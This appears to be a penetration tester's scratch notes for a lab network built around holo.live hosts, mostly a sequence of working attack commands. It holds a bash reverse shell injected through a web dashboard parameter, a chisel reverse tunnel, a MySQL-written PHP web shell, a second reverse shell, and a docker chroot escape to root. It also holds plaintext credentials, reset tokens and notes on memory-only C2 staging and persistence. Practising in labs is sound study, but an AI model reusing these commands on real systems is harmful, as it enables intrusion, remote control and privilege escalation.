# Intel

## L-SRV01
IP: 10.200.107.33
OS: Linux
Hostname:
Domain: 
VHost: www.holo.live holo.live admin.holo.live dev.holo.live
Domain SID:
Machine Purpose: Web Server Wordpress
Services:
Service Languages: PHP




## Objectives
What do have in the solutions inventory to meet large network objective?

## Solution Inventory Map
Section to solve 
 


## Data 

#### Credentials

#### Intel

#### Local Inventory



### Todo

```
# quick and dirty MD5 hashes
echo -n 'text to be encrypted' | openssl md5

# Detirmine if a port is open or closed in bash
(: </dev/tcp/127.0.0.1/80) &>/dev/null && echo "OPEN" || echo "CLOSED"

netsh interface portproxy add v4tov4 listenport=<LPORT> listenaddress=0.0.0.0 connectport=<RPORT> connectaddress=<RHOST>
ncat -lvkp 12345 -c "ncat --ssl 192.168.0.1 443"
```

### Done

```bash
# login in to 
http://admin.holo.live/index.php
# admin:DBManagerLogin!
http://admin.holo.live/dashboard.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/443+<%261'

# Setup proxychains and chisel
./chisel server -p 8888 --reverse
# curl chisel run client 
curl http://10.50.103.12/chisel-l -o chisel-l
./chisel client 10.50.103.91:8888 R:socks

proxychains mysql -h 192.168.100.1 -u admin -p
# !123SecureAdminDashboard321!
use DashboardDB;
# required create RCE on docker host
# if it does not exist

select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/nvmcmd.php';

proxychains curl "http://192.168.100.1:8080/nvmcmd.php?cmd=bash+-c+'exec+bash+-i+%26>/dev/tcp/10.50.103.91/445+<%261'"

sudo install -m =xs $(which docker) .
./docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh

```

reset for admin: 
```
b69a9e454439e1316427e518adcd887c38e8d0bbaebbdaf4831daf99431f698d93a3142e87eaca7ad4b315d18be7b0019d02
```

reset for gurag: 
```
09f7ab735e40f816e5913df5e157a0b271d1fd8c3665986bc782485322f06ee1fd2b5c5420594171050047280da9fcdeb80e
```

Set in the url to the `user_token=`  on requesting gurag password. 

https://www.youtube.com/watch?v=PqnnKMU3XMk 3:48 fin

https://www.youtube.com/watch?v=SHfzaQWithc MORE CAVALRY IS HERE, just as annoying as me! FULL Overwatch YEARS AGO https://www.youtube.com/watch?v=RIYd6Xdn88U; play on repeat - confirmed. Woohoo https://www.youtube.com/watch?v=RLxcn-rgDS8
My brain after I have finished this thing so I can move on - https://www.youtube.com/watch?v=lLPAUHdyjRI and make the best songs in the world https://www.youtube.com/watch?v=_lK4cX5xGiQ


Encrypted Sliver not to disk! Like Bishop Fox do: no mtls, or wireguard
 - https + proxy
 - Persistence:
	 - Persist a stage 1, either
		 - pull stager 2 over the network again
		 - encrypt the stage 2 and then write it to disk so that when the stage 1 runs  it read the cipher text from disk and load back into memory'
	- Just Re-exploit, no Persistence 

https://blog.zsec.uk/hellojackhunter-exploring-winsxs/
`c:\Windows\WinSxS` for the Koth madness of multiversioning bins, dlls
```
# Map out binaries
GCI -Path C:\Windows\WinSxS -Recurse -Filter *.exe | Select -First 20 | Select Name, FullName, @{l='FileVersion';e={[System.Version]($_.VersionInfo.FileVersion)}} | Group Name | ForEach-Object { $_.Group | Sort-Object -Property FileVersion -Descending | Select-Object -First 1 }
```

https://github.com/xct/winpspy
https://github.com/xct/xc
https://github.com/icyguider/Nimcrypt2 

Drop and exfil
https://github.com/DCScoder/LINTri/blob/main/LINTri.sh
https://github.com/DCScoder/WINTri/blob/main/WINTri.ps1


https://github.com/ChrisPritchard/ctf-writeups/blob/master/GO-SCRIPTING.md